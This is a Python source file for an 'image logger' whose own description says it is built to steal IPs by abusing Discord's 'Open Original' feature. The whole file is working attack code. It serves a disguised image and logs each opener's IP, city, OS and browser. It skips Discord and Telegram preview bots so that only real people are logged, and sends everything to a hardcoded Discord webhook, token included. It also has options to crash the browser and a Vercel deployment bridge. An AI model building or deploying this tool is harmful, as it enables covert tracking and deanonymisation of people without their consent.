# Discord Image Logger V2
# By Grave

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
from io import BytesIO

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1487453521128456354/LPEcnB0LS6pAlPx1mafpZn8vI_qDPSmv5sTon5weUk-PYzTc4LreBqTKCx1bQ7D_Psvy",
    "image": "https://play-lh.googleusercontent.com/EicDCzuN6l-9g4sZ6uq0fkpB-1AcVzd6HeZ6urH3KIGgjw-wXrrtpUZapjPV2wgi5R4", 
    "imageArgument": True, 

    # CUSTOMIZATION #
    "username": "Image Logger", 
    "color": 0x00FFFF, 

    # OPTIONS #
    "crashBrowser": False, 
    "accurateLocation": False, 

    "message": { 
        "doMessage": False, 
        "message": "This browser has been pwned by DeKrypt's Image Logger.", 
        "richMessage": True, 
    },

    "vpnCheck": 1, 
    "linkAlerts": True, 
    "buggedImage": True, 
    "antiBot": 1, 

    # REDIRECTION #
    "redirect": {
        "redirect": False, 
        "page": "https://your-link.here" 
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json = {
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"): return
        if config["antiBot"] == 3: return
        if config["antiBot"] in [1, 2]: ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"**A User Opened the Original Image!**\n\n**Endpoint:** `{endpoint}`\n\n**IP Info:**\n> **IP:** `{ip}`\n> **Country:** `{info.get('country', 'Unknown')}`\n> **City:** `{info.get('city', 'Unknown')}`\n\n**PC Info:**\n> **OS:** `{os}`\n> **Browser:** `{browser}`",
        }
    ],
    }
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            # Use X-Forwarded-For because Vercel is a proxy
            ip = self.headers.get('x-forwarded-for', '127.0.0.1').split(',')[0]
            ua = self.headers.get('user-agent', 'Unknown')
            
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            url = config["image"]
            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()

            if botCheck(ip, ua):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: self.wfile.write(binaries["loading"])
                makeReport(ip, useragent=ua, endpoint=s.split("?")[0], url=url)
                return
            
            result = makeReport(ip, useragent=ua, endpoint=s.split("?")[0], url=url)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            if config["redirect"]["redirect"]:
                self.wfile.write(f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode())
            else:
                self.wfile.write(binaries["loading"])

        except Exception:
            self.send_response(500)
            self.end_headers()
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

# --- VERCEL WSGI BRIDGE ---
def app(environ, start_response):
    incoming = BytesIO()
    # Reconstruct minimum required environment for the handler
    path = environ.get('PATH_INFO', '/')
    if environ.get('QUERY_STRING'):
        path += '?' + environ['QUERY_STRING']
    
    # Fake request line
    request_line = f"{environ['REQUEST_METHOD']} {path} HTTP/1.1\r\n"
    headers = ""
    for k, v in environ.items():
        if k.startswith('HTTP_'):
            headers += f"{k[5:].replace('_', '-')}: {v}\r\n"
    
    incoming = BytesIO(request_line.encode() + headers.encode() + b"\r\n")
    outgoing = BytesIO()
    
    handler = ImageLoggerAPI(incoming, ('0.0.0.0', 0), None)
    handler.wfile = outgoing
    handler.handle_one_request()
    
    outgoing.seek(0)
    response_raw = outgoing.read()
    
    # Split headers from body
    try:
        _, body = response_raw.split(b"\r\n\r\n", 1)
    except:
        body = response_raw

    start_response("200 OK", [('Content-Type', 'image/jpeg')])
    return [body]
